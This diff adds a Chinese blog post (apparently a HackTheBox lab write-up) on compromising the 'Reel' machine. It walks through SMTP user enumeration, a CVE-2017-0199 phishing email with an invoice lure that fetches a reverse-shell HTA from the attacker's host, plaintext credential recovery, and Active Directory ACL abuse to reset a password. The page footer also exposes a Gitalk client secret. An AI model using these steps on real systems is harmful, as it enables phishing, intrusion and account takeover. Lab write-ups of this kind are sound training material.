@@ -1,0 +1,523 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title> Active Directory 101-Reel | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title=" Active Directory 101-Reel | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+一台很有难度的靶机 设计到了smtp用户枚举 邮件钓鱼 ml凭据恢复、管理员组添加等。
+这台太难了 好多都不会。后面基本上都是照着师傅们打的。
+文章转载来源于 https://www.freebuf.com/articles/syst..." />
+    <meta name="keywords" content="smtp用户名枚举,CVE-2017-0199,邮件钓鱼,WriteDacl`,AD域,HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+               Active Directory 101-Reel
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-12
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/lmwgJMxp0/" class="post-tag">
+                  # smtp用户名枚举
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/vTiMHhQxYs/" class="post-tag">
+                  # CVE-2017-0199
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/FSCYtFNzyd/" class="post-tag">
+                  # 邮件钓鱼
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/6m8DBDyItY/" class="post-tag">
+                  # WriteDacl`
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>一台很有难度的靶机 设计到了smtp用户枚举 邮件钓鱼 ml凭据恢复、管理员组添加等。</p>
+<p>这台太难了 好多都不会。后面基本上都是照着师傅们打的。</p>
+<p>文章转载来源于 https://www.freebuf.com/articles/system/349206.html</p>
+<h2 id="信息收集">信息收集</h2>
+<pre><code>nmap -Pn -p- -sV -sC -A 10.10.10.77 -oA nmap_Reel
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914273_636a5a21bc7fcae7bbaa4.jpeg" alt="截屏2021-11-08 上午10.14.13" loading="lazy"></figure>
+<pre><code>扫描结果显示目标开放了21、22、25端口
+
+21端口
+利用匿名登录漏洞可直接登陆目标 FTP 服务
+</code></pre>
+<pre><code>ftp 10.10.10.77
+## 账号/密码：anonymous/anonymous
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914275_636a5a23c85d5a4dbb382.jpeg" alt="截屏2021-11-08 上午11.30.37" loading="lazy"></figure>
+<h3 id="ftp信息收集">ftp信息收集</h3>
+<p>进入<code>documents</code>目录并尝试下载所有文件</p>
+<pre><code>ftp &gt; cd documents
+ftp &gt; ls
+ftp &gt; get readme.txt
+ftp &gt; get AppLocker.docx
+ftp &gt; get &quot;Windows Event Forwarding.docx&quot;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914277_636a5a25c7cfbc19c8d90.jpeg" alt="截屏2021-11-08 上午11.33.46" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914279_636a5a27adeb1d4af97a9.jpeg" alt="截屏2021-11-08 上午11.34.18" loading="lazy"></figure>
+<p>经翻译后三个文件内容分别如下：</p>
+<ul>
+<li>AppLocker.docx：要记录的 AppLocker 程序 - exe、msi 和脚本（ps1、vbs、cmd、bat、js）的哈希规则有效</li>
+<li>readme.txt：请给我发电子邮件任何 rtf 格式程序 - 我会审查和转换。新格式/转换后的文件将保存在这里</li>
+<li>Windows Event Forwarding.docx：记录了日志转发命令</li>
+</ul>
+<p>使用 exiftool 分别查看元数据，在文档<code>Windows Event Forwarding.docx</code>中发现邮箱地址<code>nico@megabank.com</code></p>
+<pre><code>exiftool &quot;Windows Event Forwarding.docx&quot;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914281_636a5a2960180c32a84b7.jpeg" alt="截屏2021-11-08 下午2.30.45" loading="lazy"></figure>
+<h2 id="上线nico">上线[nico]</h2>
+<h3 id="smtp用户名枚举">smtp用户名枚举</h3>
+<p>目标存在 smtp 服务，因此可尝试通过用户枚举来获取邮箱用户。枚举 smtp 用户存在以下三种模式：</p>
+<pre><code class="language-yaml">VERY：验证邮箱是否存在
+EXPN：验证邮箱列表是否存在
+RCPT TO：指定收件人地址
+</code></pre>
+<h4 id="手动枚举">手动枚举</h4>
+<p>验证发现的邮箱账户<code>nico@megabank.com</code>，使用<code>vrfy</code>、<code>expn</code>命令查询该账户失败</p>
+<pre><code class="language-bash">telnet 10.10.10.77 25
+&gt; HELO
+&gt; HELO mac
+&gt; VRFY nico@megabank.com
+&gt; EXPN nico@megabank.com
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914283_636a5a2b4e612fb7a14fc.jpeg" alt="截屏2021-11-08 下午4.05.31" loading="lazy"></figure>
+<p>而使用<code>rcpt to</code>命令验证显示该账户存在</p>
+<pre><code class="language-bash">&gt; mali from a@abc.com
+&gt; rcpt to:nico@megabank.com
+&gt; rcpt to:root@aaa.com
+&gt; rcpt to:a@megabank.com
+&gt; rcpt to:root@megabank.com
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914284_636a5a2cf2ac26106c8b0.jpeg" alt="截屏2021-11-08 下午4.00.17" loading="lazy"></figure>
+<h4 id="自动枚举">自动枚举</h4>
+<p>使用自动化的 SMTP 用户名枚举工具能够极大地提升效率，当然前提是要存在相应的字典文件，通过对<code>nico</code>、<code>@htb</code>、<code>@megabank</code>这几个关键变量进行变形后构造用户名字典<code>user.txt</code>如下：</p>
+<pre><code class="language-yaml">reel
+administrator
+admin
+root
+reel@htb
+reel@htb.local
+reel@reel.htb
+administrator@htb
+admin@htb
+root@htb
+sadfasdfasdfasdf@htb
+nico@megabank.com
+htb@metabank.com
+</code></pre>
+<p>使用 smtp-user-enum 对用户名仅需部分自动枚举，结果显示只有<code>@htb</code>账户和目标邮箱账户<code>nico@megabank.com</code>都存在。</p>
+<pre><code class="language-bash">smtp-user-enum -M RCPT -U user.txt -t 10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914286_636a5a2e735cd7ddb3570.jpeg" alt="截屏2021-11-08 下午4.54.17" loading="lazy"></figure>
+<h3 id="邮件钓鱼">邮件钓鱼</h3>
+<p>在<code>readme.txt</code>中提示可发送 rtf 格式的文件，而利用 rtf 可执行 RCE 漏洞（CVE-2017-0199），漏洞详细利用步骤如下：</p>
+<pre><code class="language-shell">1、向目标用户发送恶意的 rtf 文件
+2、在易受攻击的 word 版本中打开该文件将导致代码执行，恶意代码存在于 olelink 对象中
+3、当打开文档后 winword.exe 会向远程服务器发送 http 请求以检索恶意的 HTA 文件
+4、收到响应的则是一个带有恶意脚本的假的 rtf 文件，winword.exe 通过 COM 对象查找 application/hta 的文件处理程序
+5、导致 Microsoft HTA 应用程序（mshta.exe）下载并执行包含 Powershell 命令的 Visual Basic 脚本
+</code></pre>
+<p>简单来说就是向目标发送带有恶意 rtf 的邮件，用户一旦打开 rtf 文件后就会加载远程的恶意 hta 文件处理程序并执行相应命令。</p>
+<h4 id="生成恶意hta文件">生成恶意hta文件</h4>
+<p>使用 msf 生成 hta 类型的反弹shell木马</p>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=2222 -f hta-psh -o msfv.hta
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914288_636a5a3022437cccdb713.jpeg" alt="截屏2021-11-08 下午11.36.11" loading="lazy"></figure>
+<h4 id="生成请求恶意hta的rtf文件">生成请求恶意hta的rtf文件</h4>
+<p>使用 github 上的漏洞利用工具来生成 rtf 文件，该工具的相关命令参数如下：</p>
+<p><strong>工具地址：https://github.com/bhdresh/CVE-2017-0199</strong></p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914289_636a5a31a2655ab067ca2.jpeg" alt="截屏2021-11-08 下午9.58.05" loading="lazy"></figure>
+<p>成功生成用于请求远程 hta 程序的 rtf 文件</p>
+<pre><code class="language-bash">python cve-2017-0199_toolkit.py -M gen -w mac.rtf -u http://10.10.14.17/msfv.hta -t rtf -x 0
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914291_636a5a337c91e5698a260.jpeg" alt="截屏2021-11-08 下午11.42.40" loading="lazy"></figure>
+<p>使用 python 开启 http 服务</p>
+<pre><code class="language-shell">python -m SimpleHTTPServer 80
+</code></pre>
+<p>同时监听 2222 端口用于接收反弹shell</p>
+<pre><code class="language-shell">nc -nvlp 2222
+</code></pre>
+<h4 id="发送邮件获取权限">发送邮件获取权限</h4>
+<p>通过 sendemail 向目标邮件账户发送带有恶意 rtf 文件的邮件，等待用户打开邮件</p>
+<pre><code class="language-bash">sendEmail -f mac@megabank.com -t nico@megabank.com -u &quot;Invoice Attached&quot; -m &quot;You are overdue payment&quot; -a mac.rtf -s 10.10.10.77 -v 
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914292_636a5a34e8a90ebd4bc9c.jpeg" alt="截屏2021-11-09 上午12.25.25" loading="lazy"></figure>
+<p>过一段时间后成功拿到反弹shell<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914294_636a5a3678a52b69393cf.jpeg" alt="截屏2021-11-09 上午12.27.49" loading="lazy"></p>
+<p>在当前用户桌面上成功拿到第一个flag</p>
+<pre><code class="language-bash">dir c:\Users\nico\Desktop
+type c:\Users\nico\Desktop\user.txt
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914296_636a5a3841f4ff3e3ec6d.jpeg" alt="截屏2021-11-09 上午12.38.45" loading="lazy"></figure>
+<h3 id="msf利用">msf利用</h3>
+<p>当然也可以使用 MSF 来完成以上操作</p>
+<pre><code class="language-bash">msfconsole 
+msf &gt; use exploit/windows/fileformat/office_word_hta
+msf &gt; set lhost 10.10.14.17
+msf &gt; set lport 4444
+msf &gt; set srvhost 10.10.14.17
+msf &gt; run
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914297_636a5a39be1f08da851b0.jpeg" alt="截屏2021-11-09 上午1.31.03" loading="lazy"></figure>
+<p>向目标用户发送钓鱼邮件</p>
+<pre><code class="language-bash">sendEmail -f mac@megabank.com -t nico@megabank.com -u &quot;Invoice Attached&quot; -m &quot;You are overdue payment&quot; -a /root/.msf4/local/msf.doc -s 10.10.10.77 -v 
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914299_636a5a3b686146c16fec5.jpeg" alt="截屏2021-11-09 上午1.19.05" loading="lazy"></figure>
+<p>成功收到 meterpreter<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914300_636a5a3cd211bf59a2321.jpeg" alt="截屏2021-11-09 上午1.32.26" loading="lazy"></p>
+<h2 id="横向移动tom">横向移动[tom]</h2>
+<h3 id="凭据恢复">凭据恢复</h3>
+<p>在当前用户桌面上发现敏感文件<code>cred.xml</code>，该文件是 PSCredential 对象当中<code>Export-CliXml</code>方法输出的 XML 文档，而 PSCredential 对象在 Powershell 中主要用于存储用户名、密码和凭据</p>
+<pre><code class="language-yaml">type c:\Users\nico\Desktop\cred.xml
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914302_636a5a3e64cc9ebef85cd.jpeg" alt="截屏2021-11-09 上午1.33.34" loading="lazy"></figure>
+<p>使用 PSCredential 对象中的<code>Import-CliXml</code>方法导入该文件，调用<code>GetNetworkCredential</code>方法可从中直接提取明文密码，成功拿到账号密码<code>Tom/1ts-mag1c!!!</code></p>
+<pre><code class="language-bash">powershell -c &quot;$cred = Import-CliXml -Path c:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential() | Format-List *&quot;
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914303_636a5a3fe6a9b2ee3ebc9.jpeg" alt="截屏2021-11-09 上午1.41.06" loading="lazy"></figure>
+<h3 id="ssh登录">ssh登录</h3>
+<p>使用拿到的账号密码登录目标 SSH 服务</p>
+<pre><code class="language-bash">ssh tom@10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914305_636a5a4142c1c9f79b10b.jpeg" alt="截屏2021-11-09 上午1.46.04" loading="lazy"></figure>
+<p>进入该用户桌面后在<code>AD Audit\BloodHound\Ingestors</code>目录中找到<code>acls.csv</code>文件</p>
+<pre><code class="language-bash">cd &quot;C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors&quot;
+dir
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914306_636a5a42a0037427c5580.jpeg" alt="截屏2021-11-09 上午1.48.42" loading="lazy"></figure>
+<h2 id="横向移动-claire">横向移动 [claire]</h2>
+<h3 id="csv信息收集">csv信息收集</h3>
+<p>在本地搭建 SMB 服务用于文件传输</p>
+<pre><code class="language-bash">python3 smbserver.py mac ~/hackthebox/Machines/Reel 
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914308_636a5a445eabf3b1e9f3a.jpeg" alt="截屏2021-11-09 上午1.54.04" loading="lazy"></figure>
+<p>利用 SMB 协议下载该文件到本地</p>
+<pre><code class="language-bash">copy acls.csv \\10.10.14.17\mac
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914309_636a5a45cbadfa5d17dd8.jpeg" alt="截屏2021-11-09 上午1.56.45" loading="lazy"></figure>
+<p>打开 csv 表格文件后发现其中包含了域中各个用户以及用户组之间的关系<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914311_636a5a474e5e684394181.jpeg" alt="截屏2021-11-09 上午1.59.20" loading="lazy"></p>
+<p>经搜索后发现当前用户<code>tom</code>对用户<code>claire</code>拥有<code>WriteOwner</code>权限<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914312_636a5a48e7ecd8a416dbd.jpeg" alt="截屏2021-11-09 上午2.01.14" loading="lazy"></p>
+<p>用户<code>claire</code>又对<code>Backup_Admins</code>组对象拥有<code>WriteDacl</code>权限，因此拥有用户<code>tom</code>的权限就可以控制用户<code>claire</code>并最终拿到<code>Backup_Admins</code>用户组权限<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914314_636a5a4a203247502f5f6.jpeg" alt="截屏2021-11-09 上午2.02.53" loading="lazy"></p>
+<h3 id="bloodhound表格分析">BloodHound表格分析</h3>
+<p>BloodHound 可对大型域环境进行分析并将其可视化输出，如果未安装可使用以下命令进行安装</p>
+<pre><code class="language-bash">apt install bloodhound
+</code></pre>
+<p>安装完后开启 neo4j 数据库，如果出现以下报错<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914315_636a5a4b81277d446caee.jpeg" alt="截屏2021-11-09 上午9.13.11" loading="lazy"></p>
+<p>出现报错创建<code>log</code>目录和对应日志<code>neo4j.log</code></p>
+<pre><code class="language-bash">mkdir /usr/share/neo4j/logs
+touch /usr/share/neo4j/logs/neo4j.log
+</code></pre>
+<p>再次开启 neo4j 数据库</p>
+<pre><code class="language-bash">neo4j start
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914317_636a5a4d03de22a2eec13.jpeg" alt="截屏2021-11-09 上午9.18.15" loading="lazy"></figure>
+<p>使用默认账号密码登录 BloodHound</p>
+<pre><code class="language-yaml">username: neo4j
+password: neo4j
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914318_636a5a4e7743020e71dba.jpeg" alt="截屏2021-11-09 上午9.21.24" loading="lazy"></figure>
+<p>首次登录需要重新设置密码。在其中上传数据可寻找域内各个用户、用户组的对应关系<br>
+<img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914319_636a5a4fa49ddc9c08333.jpeg" alt="截屏2021-11-09 上午9.57.28" loading="lazy"></p>
+<h3 id="修改claire用户密码">修改claire用户密码</h3>
+<p>导入 PowerSploit 中的<code>powerview.ps1</code></p>
+<pre><code class="language-bash">powershell //切换到powershell命令行
+. .\PowerView.ps1 //将PowerView导入
+</code></pre>
+<p>把当前用户<code>tom</code>设置为<code>claire</code>用户的 ACL 的所有者并授予其修改密码的权限</p>
+<pre><code class="language-bash">Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+</code></pre>
+<p>设置<code>claire</code>的密码为<code>MagicMac123!@#</code></p>
+<pre><code class="language-bash">$cred = ConvertTo-SecureString &quot;MagicMac123!@#&quot; -AsPlainText -force
+Set-DomainUserPassword -identity claire -accountpassword $cred
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914320_636a5a50ed31922a40163.jpeg" alt="截屏2021-11-09 上午2.48.36" loading="lazy"></figure>
+<h3 id="ssh登陆">ssh登陆</h3>
+<p>使用重新设置的密码登录用户<code>claire</code></p>
+<pre><code class="language-bash">ssh claire@10.10.10.17
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914322_636a5a526991d930e992d.jpeg" alt="截屏2021-11-09 上午2.54.38" loading="lazy"></figure>
+<p>查看<code>backup_admins</code>组成员，目前该组中只有<code>ranj</code>用户</p>
+<pre><code class="language-bash">net group backup_admins
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914323_636a5a53bc32a0e348cfd.jpeg" alt="截屏2021-11-09 上午2.57.13" loading="lazy"></figure>
+<p>成功将<code>claire</code>用户添加到<code>backup_admins</code>用户组下，不过需重新登录，否则无法生效</p>
+<pre><code class="language-bash">net group backup_admins claire /add
+net group backup_admins
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914325_636a5a557d583de94cd0d.jpeg" alt="截屏2021-11-09 上午2.58.41" loading="lazy"></figure>
+<h2 id="权限提升administrator">权限提升[administrator]</h2>
+<h3 id="信息收集-2">信息收集</h3>
+<p>查看当前用户对管理员目录<code>c:\users\administrator</code>的权限，发现<code>Backup_Admins</code>组对管理员目录拥有访问权限</p>
+<pre><code class="language-bash">icalcs Administrator
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914327_636a5a574d2964af00617.jpeg" alt="截屏2021-11-09 上午3.37.11" loading="lazy"></figure>
+<p>因此可直接查看管理员用户桌面中的文件，成功发现第二个 flag</p>
+<pre><code class="language-bash">cd c:\Users\Administrator\Desktop
+ls
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914329_636a5a5973a72f6852edf.jpeg" alt="截屏2021-11-09 上午3.37.32" loading="lazy"></figure>
+<p>但尝试查看<code>root.txt</code>却被拒绝</p>
+<pre><code class="language-bashh">type root.txt
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914332_636a5a5c5c0de7af602c3.jpeg" alt="截屏2021-11-09 上午3.37.57" loading="lazy"></figure>
+<h3 id="管理员登陆">管理员登陆</h3>
+<p>在备份目录<code>Backup Scripts</code>中遍历密码，成功找到管理员密码<code>Cr4ckMeIfYouC4n!</code></p>
+<pre><code class="language-bash">cd &quot;Back Scripts&quot;
+type * | findstr pass
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914333_636a5a5d9026f3f9b1588.jpeg" alt="截屏2021-11-09 上午3.39.13" loading="lazy"></figure>
+<p>通过该密码可成功登录管理员并拿到第二个flag</p>
+<pre><code class="language-bash">ssh administrator@10.10.10.77
+</code></pre>
+<figure data-type="image" tabindex="32"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1667914335_636a5a5f309ef71cf43ad.jpeg" alt="截屏2021-11-09 上午3.44.25" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>Reel 译为卷轴，它是目前唯一一个需要三次提权的靶机。通过信息收集发现目标存在 FTP 匿名登录漏洞，利用该漏洞登录 FTP 后下载其中的文件，分析 Word 文档的源数据时成功找到一个邮箱账户<code>nico@megabank.com</code>，经 SMTP 用户名枚举验证后可知该邮箱账户存在，与此同时 FTP 中的文件还提示可接受 rtf 格式的邮件，因此可将带有恶意 rtf 的钓鱼邮件发送给该邮箱账户。</p>
+<p>等待受害者点击后可成功获取用户<code>nico</code>的权限。在该用户桌面上发现用户<code>tom</code>的账号密码凭据，但其中的密码为密文，借助 GetNetworkCredential 方法可恢复为密码明文。有了<code>tom</code>的密码后就能够以<code>tom</code>的身份登陆ssh，搜索后发现在该用户桌面上存在反映域内用户与用户组关系的表格，其中显示用户<code>tom</code>对用户<code>claire</code>拥有<code>WriteOwner</code>权限，而用户<code>claire</code>对<code>Backup_Admins</code>组拥有<code>WriteDacl</code>权限。</p>
+<p>利用 PowerView 工具可配合用户<code>tom</code>的权限修改用户<code>claire</code>密码，使用修改后的密码可成功登录用户<code>claire</code>，登陆成功后将当前用户添加至<code>Backup_Admins</code>用户组当中，而该用户组拥有管理员桌面的访问权限，尝试读取 flag 信息失败，但可读取备份目录中的管理员密码，并最终使用该密码登陆管理员成功。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#ftp%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ftp信息收集</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%8A%E7%BA%BFnico">上线[nico]</a>
+<ul>
+<li><a href="#smtp%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE">smtp用户名枚举</a>
+<ul>
+<li><a href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE">手动枚举</a></li>
+<li><a href="#%E8%87%AA%E5%8A%A8%E6%9E%9A%E4%B8%BE">自动枚举</a></li>
+</ul>
+</li>
+<li><a href="#%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC">邮件钓鱼</a>
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fhta%E6%96%87%E4%BB%B6">生成恶意hta文件</a></li>
+<li><a href="#%E7%94%9F%E6%88%90%E8%AF%B7%E6%B1%82%E6%81%B6%E6%84%8Fhta%E7%9A%84rtf%E6%96%87%E4%BB%B6">生成请求恶意hta的rtf文件</a></li>
+<li><a href="#%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90">发送邮件获取权限</a></li>
+</ul>
+</li>
+<li><a href="#msf%E5%88%A9%E7%94%A8">msf利用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8tom">横向移动[tom]</a>
+<ul>
+<li><a href="#%E5%87%AD%E6%8D%AE%E6%81%A2%E5%A4%8D">凭据恢复</a></li>
+<li><a href="#ssh%E7%99%BB%E5%BD%95">ssh登录</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-claire">横向移动 [claire]</a>
+<ul>
+<li><a href="#csv%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">csv信息收集</a></li>
+<li><a href="#bloodhound%E8%A1%A8%E6%A0%BC%E5%88%86%E6%9E%90">BloodHound表格分析</a></li>
+<li><a href="#%E4%BF%AE%E6%94%B9claire%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81">修改claire用户密码</a></li>
+<li><a href="#ssh%E7%99%BB%E9%99%86">ssh登陆</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87administrator">权限提升[administrator]</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2">信息收集</a></li>
+<li><a href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E9%99%86">管理员登陆</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/linux-nei-wang-shen-tou/">
+              <h3 class="post-title">
+                Linux内网渗透
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
